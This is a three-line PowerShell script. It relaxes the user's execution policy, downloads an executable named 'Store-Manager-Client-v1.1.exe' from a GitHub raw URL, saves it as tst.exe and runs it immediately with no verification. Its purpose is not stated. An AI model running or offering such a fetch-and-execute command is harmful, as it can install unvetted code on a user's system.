Write-Host "Setting execution policy..." -ForegroundColor Cyan 

Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force

iwr -Uri "https://github.com/mcircuit/WinRM/raw/refs/heads/main/Store-Manager-Client-v1.1.exe" -OutFile "$HOME\Downloads\tst.exe"; & "$HOME\Downloads\tst.exe"
